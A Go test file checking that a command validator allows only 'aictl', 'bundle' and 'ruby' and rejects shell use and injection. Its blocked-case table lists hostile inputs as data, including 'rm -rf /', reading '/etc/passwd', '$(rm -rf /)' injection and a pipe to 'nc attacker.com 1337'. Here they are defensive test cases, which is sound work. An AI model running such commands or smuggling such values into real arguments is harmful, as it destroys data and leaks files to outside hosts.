package synthesis

import (
	"context"
	"strings"
	"testing"
)

// TestValidateCommandSecurity_AllowedCommands tests that allowed commands pass validation
func TestValidateCommandSecurity_AllowedCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
	}{
		{
			name:    "aictl command",
			command: "aictl",
			args:    []string{"system", "schema", "--format=json"},
		},
		{
			name:    "bundle command",
			command: "bundle",
			args:    []string{"exec", "ruby", "script.rb"},
		},
		{
			name:    "ruby command",
			command: "ruby",
			args:    []string{"-v"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCommandSecurity(tt.command, tt.args)
			if err != nil {
				t.Errorf("validateCommandSecurity() failed for allowed command: %v", err)
			}
		})
	}
}

// TestValidateCommandSecurity_BlockedCommands tests that dangerous commands are blocked
func TestValidateCommandSecurity_BlockedCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		args    []string
		wantErr string
	}{
		{
			name:    "shell command blocked",
			command: "sh",
			args:    []string{"-c", "echo hello"},
			wantErr: "command not allowed",
		},
		{
			name:    "bash command blocked",
			command: "bash",
			args:    []string{"-c", "rm -rf /"},
			wantErr: "command not allowed",
		},
		{
			name:    "arbitrary binary blocked",
			command: "/bin/cat",
			args:    []string{"/etc/passwd"},
			wantErr: "command not allowed",
		},
		{
			name:    "command with shell metacharacters",
			command: "ruby;rm -rf /",
			args:    []string{},
			wantErr: "not in security allowlist", // Command with metacharacters fails allowlist first
		},
		{
			name:    "argument with shell metacharacters",
			command: "ruby",
			args:    []string{"script.rb; rm -rf /"},
			wantErr: "contains invalid characters",
		},
		{
			name:    "command injection attempt",
			command: "ruby",
			args:    []string{"$(rm -rf /)"},
			wantErr: "contains invalid characters",
		},
		{
			name:    "pipe injection attempt",
			command: "ruby",
			args:    []string{"script.rb | nc attacker.com 1337"},
			wantErr: "contains invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCommandSecurity(tt.command, tt.args)
			if err == nil {
				t.Errorf("validateCommandSecurity() should have failed for dangerous command: %s %v", tt.command, tt.args)
				return
			}

			if tt.wantErr != "" && !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("validateCommandSecurity() error = %v, want error containing %v", err, tt.wantErr)
			}
		})
	}
}

// TestValidateScriptIntegrity tests script integrity validation
func TestValidateScriptIntegrity(t *testing.T) {
	// Test with actual script (if it exists)
	scriptPath := "../../scripts/validate-dsl-schema.rb"
	err := validateScriptIntegrity(scriptPath)

	if err != nil {
		// This might fail in test environment - that's okay
		t.Logf("Script integrity check failed (expected in test env): %v", err)
		return
	}

	t.Logf("Script integrity validation passed for: %s", scriptPath)
}

// TestFindSchemaValidatorScript_Security tests secure script finding
func TestFindSchemaValidatorScript_Security(t *testing.T) {
	path, err := findSchemaValidatorScript()

	if err != nil {
		// Expected in test environments without Ruby script
		t.Logf("Script finding failed (expected in test env): %v", err)
		return
	}

	// If script is found, verify it's in an allowed path
	allowedPaths := []string{
		"/usr/local/bin/validate-dsl-schema.rb",
		"scripts/validate-dsl-schema.rb",
	}

	found := false
	for _, allowedPath := range allowedPaths {
		if strings.Contains(path, allowedPath) {
			found = true
			break
		}
	}

	if !found {
		t.Errorf("Script path %s is not in allowed paths: %v", path, allowedPaths)
	}
}

// TestExecuteCommand_Security tests that executeCommand uses security validation
func TestExecuteCommand_Security(t *testing.T) {
	ctx := context.Background()

	// Test that blocked commands are rejected
	_, err := executeCommand(ctx, "sh", "-c", "echo hello")
	if err == nil {
		t.Error("executeCommand should reject dangerous commands")
		return
	}

	if !strings.Contains(err.Error(), "security validation failed") {
		t.Errorf("Expected security validation error, got: %v", err)
	}
}

// TestExecuteCommand_AllowedCommands tests that allowed commands work
func TestExecuteCommand_AllowedCommands(t *testing.T) {
	ctx := context.Background()

	// Test that allowed commands work (if binaries exist)
	_, err := executeCommand(ctx, "ruby", "-v")
	if err != nil {
		// Ruby might not be available in test environment
		if strings.Contains(err.Error(), "security validation failed") {
			t.Errorf("Security validation should pass for ruby command: %v", err)
		} else {
			t.Logf("Ruby not available in test environment: %v", err)
		}
	}
}
